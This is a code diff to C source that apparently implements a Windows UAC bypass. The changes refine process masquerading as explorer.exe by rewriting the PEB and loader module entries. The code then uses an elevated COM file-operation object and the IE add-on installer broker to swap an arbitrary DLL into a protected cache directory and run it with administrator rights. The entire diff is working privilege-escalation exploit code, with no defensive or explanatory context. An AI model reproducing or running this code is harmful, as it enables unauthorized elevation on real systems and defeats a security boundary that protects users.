@@ -284,7 +284,7 @@ CLEANUP:
 	return Result;
 }
 
-BOOL MasqueradedMoveDirectoryFileCOM
+BOOL MasqueradedMoveCopyDirectoryFileCOM
 (
 	_In_ LPWSTR lpSrcFileName,
 	_In_ LPWSTR lpDestPath,
@@ -304,8 +304,8 @@ BOOL MasqueradedMoveDirectoryFileCOM
 	RtlSecureZeroMemory(&BindOpts, sizeof(BindOpts));
 	BindOpts.cbStruct = sizeof(BindOpts);
 	BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
-	//hResult = CoGetObject(wszMoniker, &BindOpts, &IID_IFileOperation, &pFileOperation);
-	hResult = CoCreateInstance(&CLSID_FileOperation, NULL, CLSCTX_ALL, &IID_IFileOperation , &pFileOperation);
+	hResult = CoGetObject(wszMoniker, &BindOpts, &IID_IFileOperation, &pFileOperation);
+	//hResult = CoCreateInstance(&CLSID_FileOperation, NULL, CLSCTX_ALL, &IID_IFileOperation , &pFileOperation);
 	if (FAILED(hResult)) {
 		LogError(L"CoGetObject failed at %lls", __FUNCTIONW__);
 		goto CLEANUP;
@@ -319,13 +319,13 @@ BOOL MasqueradedMoveDirectoryFileCOM
 
 	hResult = SHCreateItemFromParsingName(lpSrcFileName, NULL, &IID_IShellItem, &pSrcItem);
 	if (FAILED(hResult)) {
-		LogError(L"SHCreateItemFromParsingName failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"SHCreateItemFromParsingName failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
 		goto CLEANUP;
 	}
 
 	hResult = SHCreateItemFromParsingName(lpDestPath, NULL, &IID_IShellItem, &pDestItem);
 	if (FAILED(hResult)) {
-		LogError(L"SHCreateItemFromParsingName failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"SHCreateItemFromParsingName failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
 		goto CLEANUP;
 	}
 
@@ -368,11 +368,43 @@ CLEANUP:
 	return Result;
 }
 
+VOID NTAPI LdrEnumModulesCallback
+(
+	_In_ PLDR_DATA_TABLE_ENTRY DataTableEntry,
+	_In_ PVOID Context,
+	_Inout_ BOOLEAN* StopEnumeration
+)
+{
+	PPEB pPeb = NtCurrentPeb();
+	LPWSTR lpFullDllName, lpBaseDllName;
+	LPWSTR* pOldDllName = &(*(LPWSTR**)Context)[2];
+
+	if (DataTableEntry->DllBase == pPeb->ImageBaseAddress) {
+		if (pOldDllName[0] != NULL && pOldDllName[1] != NULL) {
+			lpFullDllName = pOldDllName[0];
+			lpBaseDllName = pOldDllName[1];
+		}
+		else {
+			pOldDllName[1] = DataTableEntry->BaseDllName.Buffer;
+			pOldDllName[0] = DataTableEntry->FullDllName.Buffer;
+			lpFullDllName = pOldDllName[2];
+			lpBaseDllName = PathFindFileNameW(pOldDllName[2]);
+		}
+
+		RtlInitUnicodeString(&DataTableEntry->FullDllName, lpFullDllName);
+		RtlInitUnicodeString(&DataTableEntry->BaseDllName, lpBaseDllName);
+		*StopEnumeration = TRUE;
+	}
+	else {
+		*StopEnumeration = FALSE;
+	}
+}
+
 BOOL MasqueradeProcessPath
 (
 	_In_ LPWSTR lpNewPath,
 	_In_ BOOL Restore,
-	_Inout_opt_ LPWSTR* pOldPath
+	_Inout_opt_ LPWSTR* pBackupPath
 )
 {
 	PPEB pPeb = NULL;
@@ -384,12 +416,13 @@ BOOL MasqueradeProcessPath
 		lpImagePathName = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 		lstrcpyW(lpImagePathName, lpNewPath);
 		lpCommandLine = PathFindFileNameW(lpImagePathName);
-		pOldPath[0] = pPeb->ProcessParameters->ImagePathName.Buffer;
-		pOldPath[1] = pPeb->ProcessParameters->CommandLine.Buffer;
+		pBackupPath[0] = pPeb->ProcessParameters->ImagePathName.Buffer;
+		pBackupPath[1] = pPeb->ProcessParameters->CommandLine.Buffer;
+		pBackupPath[4] = lpNewPath;
 	}
 	else {
-		lpImagePathName = pOldPath[0];
-		lpCommandLine = pOldPath[1];
+		lpImagePathName = pBackupPath[0];
+		lpCommandLine = pBackupPath[1];
 	}
 
 	RtlAcquirePebLock();
@@ -400,6 +433,7 @@ BOOL MasqueradeProcessPath
 	RtlInitUnicodeString(&pPeb->ProcessParameters->ImagePathName, lpImagePathName);
 	RtlInitUnicodeString(&pPeb->ProcessParameters->CommandLine, lpCommandLine);
 	RtlReleasePebLock();
+	LdrEnumerateLoadedModules(0, &LdrEnumModulesCallback, &pBackupPath);
 }
 
 BOOL IeAddOnInstallMethod
@@ -431,16 +465,17 @@ BOOL IeAddOnInstallMethod
 	HANDLE hProc = NULL;
 	BOOL Result = FALSE;
 	WCHAR wszExplorerPath[MAX_PATH];
-	LPWSTR OldPath[2];
+	LPWSTR BackupPath[5];
 
 	RtlSecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
 	GetWindowsDirectoryW(wszExplorerPath, _countof(wszExplorerPath));
 	lstrcatW(wszExplorerPath, L"\\explorer.exe");
-	MasqueradeProcessPath(wszExplorerPath, FALSE, OldPath);
+	RtlSecureZeroMemory(BackupPath, sizeof(BackupPath));
+	MasqueradeProcessPath(wszExplorerPath, FALSE, BackupPath);
 	hResultInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 	hResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
 	if (FAILED(hResult)) {
-		LogError(L"CoInitializeSecurity failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"CoInitializeSecurity failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
 		goto CLEANUP;
 	}
 
@@ -449,36 +484,32 @@ BOOL IeAddOnInstallMethod
 	BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
 	hResult = CoGetObject(wszMoniker, &BindOpts, &IID_IEAxiAdminInstaller, &BrokerObject);
 	if (FAILED(hResult)) {
-		LogError(L"CoGetObject failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"CoGetObject failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
 		goto CLEANUP;
 	}
 
 	hResult = BrokerObject->lpVtbl->InitializeAdminInstaller(BrokerObject, NULL, 0, &AdminInstallerUuid);
 	if (FAILED(hResult)) {
-		LogError(L"InitializeAdminInstaller failed at %lls.\n", __FUNCTIONW__);
+		LogError(L"InitializeAdminInstaller failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
 		goto CLEANUP;
 	}
 
 	hResult = BrokerObject->lpVtbl->QueryInterface(BrokerObject, &IID_IEAxiInstaller2, &InstallBroker);
 	if (FAILED(hResult)) {
-		LogError(L"InitializeAdminInstaller failed at %lls.\n", __FUNCTIONW__);
+		LogError(L"InitializeAdminInstaller failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
 		goto CLEANUP;
 	}
 
 	GetSystemDirectoryW(wszConsentPath, _countof(wszConsentPath));
 	lstrcatW(wszConsentPath, L"\\consent.exe");
 	FileToVerify = SysAllocString(wszConsentPath);
-	if (FileToVerify != NULL) {
-		hResult = InstallBroker->lpVtbl->VerifyFile(InstallBroker, AdminInstallerUuid, INVALID_HANDLE_VALUE, FileToVerify, FileToVerify, NULL, WTD_UI_NONE, WTD_UICONTEXT_EXECUTE, &IID_IUnknown, &CacheItemFilePath, &cbDummy , &pDummy);
-		if (FAILED(hResult)) {
-			LogError(L"VerifyFile failed at %lls.\n", __FUNCTIONW__);
-			goto CLEANUP;
-		}
-
-		CoTaskMemFree(pDummy);
-		SysFreeString(FileToVerify);
+	hResult = InstallBroker->lpVtbl->VerifyFile(InstallBroker, AdminInstallerUuid, INVALID_HANDLE_VALUE, FileToVerify, FileToVerify, NULL, WTD_UI_NONE, WTD_UICONTEXT_EXECUTE, &IID_IUnknown, &CacheItemFilePath, &cbDummy , &pDummy);
+	if (FAILED(hResult)) {
+		LogError(L"VerifyFile failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
+		goto CLEANUP;
 	}
 
+	CoTaskMemFree(pDummy);
 	if (!MasqueradedDeleteDirectoryFileCOM(CacheItemFilePath)) {
 		goto CLEANUP;
 	}
@@ -486,6 +517,7 @@ BOOL IeAddOnInstallMethod
 	cbCacheItemFilePath = SysStringLen(CacheItemFilePath);
 	lpDllPath = ALLOC(cbCacheItemFilePath * sizeof(WCHAR));
 	GetTempPathW(_countof(wszTempPath), wszTempPath);
+	wszTempPath[lstrlenW(wszTempPath) - 1] = L'\0';
 	swprintf_s(lpDllPath, cbCacheItemFilePath, L"%lls\\%lls", wszTempPath, PathFindFileNameW(CacheItemFilePath));
 	if (!WriteToFile(lpDllPath, pBuffer, cbBuffer)) {
 		goto CLEANUP;
@@ -493,7 +525,7 @@ BOOL IeAddOnInstallMethod
 
 	lpDirPath = DuplicateStrW(CacheItemFilePath, 0);
 	PathRemoveFileSpecW(lpDirPath);
-	if (!MasqueradedMoveDirectoryFileCOM(lpDllPath, lpDirPath, FALSE)) {
+	if (!MasqueradedMoveCopyDirectoryFileCOM(lpDllPath, lpDirPath, FALSE)) {
 		goto CLEANUP;
 	}
 
@@ -501,7 +533,7 @@ BOOL IeAddOnInstallMethod
 	EmptyBstr = SysAllocString(L"");
 	hResult = InstallBroker->lpVtbl->RunSetupCommand(InstallBroker, AdminInstallerUuid, NULL, CacheItemFilePath, EmptyBstr, WorkDir, EmptyBstr, 4, &hProc);
 	if (FAILED(hResult)) {
-		LogError(L"RunSetupCommand failed at %lls.\n", __FUNCTIONW__);
+		LogError(L"RunSetupCommand failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, hResult);
 		goto CLEANUP;
 	}
 
@@ -511,7 +543,7 @@ BOOL IeAddOnInstallMethod
 
 	Result = TRUE;
 CLEANUP:
-	MasqueradeProcessPath(NULL, TRUE, OldPath);
+	MasqueradeProcessPath(NULL, TRUE, BackupPath);
 	if (InstallBroker) {
 		InstallBroker->lpVtbl->Release(InstallBroker);
 	}
@@ -526,6 +558,10 @@ CLEANUP:
 
 	if (lpDirPath != NULL) {
 		FREE(lpDirPath);
+	}
+
+	if (FileToVerify != NULL) {
+		SysFreeString(FileToVerify);
 	}
 
 	if (WorkDir != NULL) {
